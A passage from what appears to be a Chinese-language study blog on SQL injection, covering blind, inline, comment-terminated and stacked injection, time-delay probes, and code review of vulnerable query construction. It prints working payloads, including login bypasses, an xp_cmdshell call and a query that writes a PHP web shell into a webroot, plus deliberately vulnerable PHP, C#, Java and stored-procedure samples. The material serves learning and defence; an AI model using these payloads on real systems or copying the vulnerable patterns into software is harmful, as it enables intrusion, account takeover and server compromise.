title="不同大小的响应"></a>不同大小的响应</h6><p>每次返回的响应都有所不同，比较这些细微的不同，可能找到一些注入线索</p><p>比如返回的内容，状态码……</p><h5 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h5><p>一个页面会因为不同的操作产生不同的状态，用不同的状态来表示注入的结果，自动化注入不同的内容，并根据响应状态判断注入结果，这就是SQL盲注，当然，要先找到注入点</p><p>例子</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=1</span><span class="token comment">--返回第一件商品</span>http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=2</span>―返回第二件商品<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>id=2时是正常查询， 加上<code>or 1=1</code>后会查询所有列，数据库检测该语句为异常，会返回id=1的页面，而<code>or 1=2</code>相当id=2 不影响sql语句，会进入id=2的页面</p><p>这样就可以通过返回页面判断注入是否成功 <code>or +payload</code></p><h3 id="确认SQL注入"><a href="#确认SQL注入" class="headerlink" title="确认SQL注入"></a>确认SQL注入</h3><h4 id="区别数字和字符串"><a href="#区别数字和字符串" class="headerlink" title="区别数字和字符串"></a>区别数字和字符串</h4><p>数字不需要使用单引号来表示</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span><span class="token number">3</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> <span class="token keyword">value</span> <span class="token operator">&gt;</span> <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他类型使用单引号来表示</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> name <span class="token operator">=</span> <span class="token string">'Bike'</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> published_date<span class="token operator">&gt;</span><span class="token string">'01/01/2013'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="内联SQL注入"><a href="#内联SQL注入" class="headerlink" title="内联SQL注入"></a>内联SQL注入</h4><p>内联注入是指向查询注入一些SQL代码后，原来的代码仍然会全部执行</p><h5 id="字符串内联注入"><a href="#字符串内联注入" class="headerlink" title="字符串内联注入"></a>字符串内联注入</h5><p>实例——用户提交用户和口令发送到数据库查询对用户进行验证</p><p><img src="https://images.dadream.eu.org/images/2024/07/890687249876e3832a2b2b96b5398fe6.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">查询语句<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>单引号报错和前面一样</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里可以直接<code>' or 1=1 #</code>绕过验证登录，但是要不改变sql语句的结构，就不能注释后面的语句</p><p>这时<code>'or '1'='1</code>不会得到想要结果，因为and、or的优先级，and优先</p><p><code>username='' or '1'='1 and password=''</code>按照</p><p><code>username='' or ('1'='1' and password='')</code>执行</p><p>所以改变payload<code>' or 1=1 or '1'='1</code> </p><p>当只允许返回一行时，指定返回admin <code>'admin' and 1=1 or '1'='1</code></p><p>在passwd字段注入，<code>'or '1'='1</code>返回所有行</p><p><img src="https://images.dadream.eu.org/images/2024/07/6fd62d2c5717e94dd7bcba0e4342e9d9.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users<span class="token keyword">SET</span> password <span class="token operator">=</span> <span class="token string">'new_password'</span><span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'Bob'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'old_password'</span> <span class="token operator">OR</span> <span class="token string">'1'</span><span class="token operator">=</span> <span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>' OR '1'= '1</code>是注入代码</p><p>功能是将所有用户密码更新</p><h5 id="数字值内联注入"><a href="#数字值内联注入" class="headerlink" title="数字值内联注入"></a>数字值内联注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token keyword">FROM</span> messages<span class="token keyword">WHERE</span> uid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">USER</span> ENTRY<span class="token punctuation">]</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> received<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>少了引号的闭合，更简单了，直接构造永真返回全部<code>num or 1=1</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/8fd1fb2d04843d8266fc16528242a2fe.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/51d72d1c3f1546657dce86675b9594ed.png"></p><h4 id="终止式SQL注入"><a href="#终止式SQL注入" class="headerlink" title="终止式SQL注入"></a>终止式SQL注入</h4><p>攻击者在SQL注入代码时，通过注释掉剩余部分查询语句，从而结束原来的查询语句</p><h5 id="数据库注释语法"><a href="#数据库注释语法" class="headerlink" title="数据库注释语法"></a>数据库注释语法</h5><p><img src="https://images.dadream.eu.org/images/2024/07/81720d0d80330ebb159aadb6ca6c3bd2.png"></p><p><code>/* */</code>可以用来绕过过滤空格</p><p><code>1 or 1=1 </code>过滤空格变成<code>1or1=1</code></p><p><code>/* */</code>绕过 <code>1/**/or/**/1=1</code></p><p>还能用来检测SQL注入对注释的处理<code>id=1/*test*/</code>，没有影响话可能存在注入</p><h5 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h5><p>使用前面相同的用户登录验证</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">查询语句<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>' or 1=1 -- </code> or  <code>' or 1=1 #</code>返回所有行</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">-- ' and password='$passwd' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>admin';#</code>  冒充admin登录</p><p><code>username=admin';/*'</code> <code>passwd=*/'</code>这种用于存在多个攻击参数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string">' AND passwd = '</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注释后剩一对单引号，连接形成空字符串，对查询无影响</p><p><img src="https://images.dadream.eu.org/images/2024/07/d88c49974a29200155cf33378156e89b.png"></p><p>可以用来判断数据库类型</p><p><img src="https://images.dadream.eu.org/images/2024/07/a87270ed8be250f52c67e92a08d774e1.png"></p><h5 id="执行多条语句"><a href="#执行多条语句" class="headerlink" title="执行多条语句"></a>执行多条语句</h5><p>还有另一个名字，堆叠注入，终止了一条语句，可以创建一条全新的没有限制的语句，简单说就是将原始语句结束，在后面加几条新语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a <span class="token keyword">from</span> q<span class="token punctuation">;</span><span class="token keyword">select</span> b <span class="token keyword">from</span> w<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mssql 6.0后允许在同一连接句柄上执行包含多条语句的字符串，Mysql 4.1后也引入该功能，默认不开启，Oracle不支持，除非使用PL/SQL</p><p>运用前面having 1=1和group up 技术</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">……id<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">-- +</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有其他可利用技术</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> administrators <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token string">'mysecretpassword'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">;</span><span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'ping www.google.com'</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'&lt;?php echo shell_exec($_GET["cmd"]);?&gt;'</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/var/www/victim.com/shell.php'</span><span class="token punctuation">;</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/3a91874d8bb2d2ad880d89fdd1f51473.png"></p><h4 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h4><p>没有回显和报错信息被隐藏的时候，可以向数据库注入时间延迟，数据库返回的时间反映在web页面，用来确定是否有SQL注入</p><p>mssql内置的设置延迟的命令<code>waitfor delay 'hours:minutes:seconds'</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">waitfor</span> delay <span class="token string">'0:0:5'</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个payload意义就是让数据库延迟5秒返回数据</p><p>mysql种没有时间延迟的函数，它使用一些执行时间很长的函数，来引入延迟。比如<code>benchmark</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">benchmark<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span>encode<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token string">'tets'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将后面的命令执行10000次，这样时间就长了，为了更明显，可以增大次数</p><p>oracle PL/SQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span>DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#休眠五秒</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>限制：不能直接子查询，管理员才能使用DBMS_LOCK包</p><p>另一个方法</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">32</span> <span class="token operator">or</span> l<span class="token operator">=</span>dbms_pipe<span class="token punctuation">.</span>receive_ message<span class="token punctuation">(</span><span class="token string">'RDS'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒</p><p>PostgreSQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="自动寻找SQL注入"><a href="#自动寻找SQL注入" class="headerlink" title="自动寻找SQL注入"></a>自动寻找SQL注入</h3><ul><li>识别数据输入</li><li>注入数据</li><li>检测响应中的异常</li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="HP-WebInspect"><a href="#HP-WebInspect" class="headerlink" title="HP WebInspect"></a>HP WebInspect</h5><h5 id="IBM-Rational-AppScan"><a href="#IBM-Rational-AppScan" class="headerlink" title="IBM Rational AppScan"></a>IBM Rational AppScan</h5><h5 id="HP-Scrawlr"><a href="#HP-Scrawlr" class="headerlink" title="HP Scrawlr"></a>HP Scrawlr</h5><h5 id="SQLiX"><a href="#SQLiX" class="headerlink" title="SQLiX"></a>SQLiX</h5><h5 id="Paros-Proxy-Zed-Attack-Proxy"><a href="#Paros-Proxy-Zed-Attack-Proxy" class="headerlink" title="Paros Proxy/Zed Attack Proxy"></a>Paros Proxy/Zed Attack Proxy</h5><h2 id="复查代码中的SQL注入"><a href="#复查代码中的SQL注入" class="headerlink" title="复查代码中的SQL注入"></a>复查代码中的SQL注入</h2><p>在代码中找bug，有代码审计的味道，审计的是sql代码</p><h3 id="复查源代码中的SQL注入"><a href="#复查源代码中的SQL注入" class="headerlink" title="复查源代码中的SQL注入"></a>复查源代码中的SQL注入</h3><ul><li>静态代码分析：分析源代码，但不执行</li><li>动态代码分析：在执行代码是分析</li><li>渗入点(安全敏感函数)：易受攻击的位置</li></ul><p>从渗入点进入审查，找到注入参数的位置，分析函数</p><h4 id="危险的编码行为"><a href="#危险的编码行为" class="headerlink" title="危险的编码行为"></a>危险的编码行为</h4><h5 id="将未验证的输入拼接成SQL语句并执行"><a href="#将未验证的输入拼接成SQL语句并执行" class="headerlink" title="将未验证的输入拼接成SQL语句并执行"></a>将未验证的输入拼接成SQL语句并执行</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//在PHP中执行一条动态构造的SQL语句</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM table WHERE field = '<span class="token interpolation"><span class="token variable">$_GET</span></span>["</span>input"<span class="token punctuation">]</span>'<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">//在C#中执行一条动态构造的SQL语句SqlCommand command = new SqlCommmand("SELECT * FROM table WHERE field = '" + request.getParameter ("input") + "'" ,connection); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//在Java中执行一条动态构造的SQL语句</span><span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM table WHERE field = '"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>getParameter <span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="存储过程也会有SQL注入"><a href="#存储过程也会有SQL注入" class="headerlink" title="存储过程也会有SQL注入"></a>存储过程也会有SQL注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">// MS SQL Server中易受攻击的存储过程</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token variable">@input</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">NULL</span> <span class="token keyword">AS</span><span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span> <span class="token string">''''</span><span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">// MySQL中易受攻击的存储过程</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token punctuation">(</span>input <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">BEGIN</span><span class="token keyword">SET</span> <span class="token variable">@param</span> <span class="token operator">=</span> input<span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token variable">@sql</span> <span class="token operator">=</span> concat<span class="token punctuation">(</span><span class="token string">'SELECT field FROM table WHERE field='</span><span class="token punctuation">,</span><span class="token variable">@param</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">PREPARE</span> stmt <span class="token keyword">FROM</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span class="token keyword">DEALLOCATE</span> <span class="token keyword">PREPARE</span> stmt<span class="token punctuation">;</span><span class="token keyword">End</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Oracle中易受攻击的存储过程</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token punctuation">(</span>input <span class="token operator">IN</span> VARCHAR2<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">sql</span> VARCHAR2<span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">sql</span> :<span class="token operator">=</span><span class="token string">'SELECT field FROM table WHERE field = '''</span> <span class="token operator">||</span> input <span class="token operator">||</span> <span class="token string">''''</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token keyword">sql</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//在PHP中动态地执行SQL存储过程</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select SP_StoredProcedure(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//在C#中动态地执行SQL存储过程</span>SqlCommand cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlCommand</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SP_StoredProceduren"</span><span class="token punctuation">,</span> conn<span class="token punctuation">)</span><span class="token punctuation">;</span>cmd<span class="token operator">.</span>CommandType <span class="token operator">=</span> CommandType<span class="token operator">.</span>StoredProcedure<span class="token punctuation">;</span>cmd<span class="token operator">.</span>Parameters<span class="token operator">.</span><span class="token function">Add</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SqlParameter</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"@input"</span><span class="token punctuation">,</span>request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>SqlDataReader rdr <span class="token operator">=</span> cmd<span class="token operator">.</span><span class="token function">ExecteReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在Java中动态地执行SQL存储过程</span>CallableStatement cs <span class="token operator">=</span> con<span class="token operator">.</span><span class="token function">prepareCall</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"{call SP_StoredProcedure request.getParameter("</span>input<span class="token string double-quoted-string">")}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword type-declaration">string</span> output <span class="token operator">=</span> cs<span class="token operator">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="PHP中HTTP函数"><a href="#PHP中HTTP函数" class="headerlink" title="PHP中HTTP函数"></a>PHP中HTTP函数</h5><p>php表单提交有两种方式：GET、POST</p><p>GET方式显式提交，地址栏可以看到请求参数，并且有大小限制</p><p><code>test.php?id=1&amp;num=2</code></p><p>POST隐式提交，需要抓包才能看到参数，没有大小限制</p><p><code>&amp;</code> <code>;</code>分割参数，<code>=</code>分割参数名称和值</p><p>一种特殊的参数<code>cookie</code>通常保存在服务器上用于验证</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_GET</span>：一个关联数组，存放通过<span class="token constant">HTTP</span> <span class="token constant">GET</span>方法传递的变量。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$HTTP_GET_VARS</span>：与<span class="token variable">$_GET</span>相同，在<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> 中已弃用。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_GET_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_POST</span>：一个关联数组，存放通过<span class="token constant">HTTP</span> <span class="token constant">POST</span>方法传递的变量。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$HTTP_POST_VARS</span>：与<span class="token variable">$_POST</span> 相同，在<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> 中已弃用。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_POST_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_REQUEST</span>：一个关联数组，包含<span class="token variable">$_GET</span>、$ <span class="token constant">POST</span>和<span class="token variable">$_</span>（：<span class="token number">001</span><span class="token operator">&lt;</span><span class="token operator">^</span>的内容。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span>：一个关联数组，存放通过<span class="token constant">HTTP</span> cookie传递给当前脚本的变量。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$HTTP_COOKIE_VARS</span>：与<span class="token variable">$_COOKIE</span>相同，在<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> 中已弃用。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_COOKIE_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SERVER</span>：服务器及执行环境的信息。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$HTTP_SERVER_VARS</span>：与<span class="token variable">$_SERVER</span> 相同，在<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> 中已弃用。<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_SERVER_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php.ini中<code>register_globals=On</code>时，将EGPCS（Environment、GET、POST、Cookie、Server）注册成全局变量，已被遗弃并且处于Off状态。</p><h5 id="JAVA中HTTP函数"><a href="#JAVA中HTTP函数" class="headerlink" title="JAVA中HTTP函数"></a>JAVA中HTTP函数</h5><p>HTTP请求对象的类名和接口名称是<code>HTTPServletRequest</code>,引用是写成<code>javax.servlet.HttpServletRequest</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//getParameter()返回所请求的给定参数的值</span><span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getParameterValues()以一个数组的方式返回给定参数请求的所有值</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> string_array <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getQueryString()返回请求的查询字符串</span><span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getHeaders()返回所请求的头的值</span>sting string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getHeaders()以一个字符串对象的枚举返回请求头</span><span class="token class-name">Enumeration</span> enumeration_object <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getRequestedSessionld()返回客户端指定的 Session ID</span><span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestedSessionld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getCookies()返回一个cookie对象的数组</span><span class="token class-name">Cookie</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">Cookie_array</span> <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//cookie.getValue()返回所请求的给定cookie的值</span><span class="token class-name">String</span> string_variale <span class="token operator">=</span> <span class="token class-name">Cookie_array</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="C-中HTTP函数"><a href="#C-中HTTP函数" class="headerlink" title="C#中HTTP函数"></a>C#中HTTP函数</h5><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">//HttpCookieCollection所有 cookie 的集合HttpCookieCollection variable = Request.Cookies;//Form―所有表单值的集合string variable = Request.Form["name"];//Headers所有头的集合string variable = Request.Headers["name"];//Params 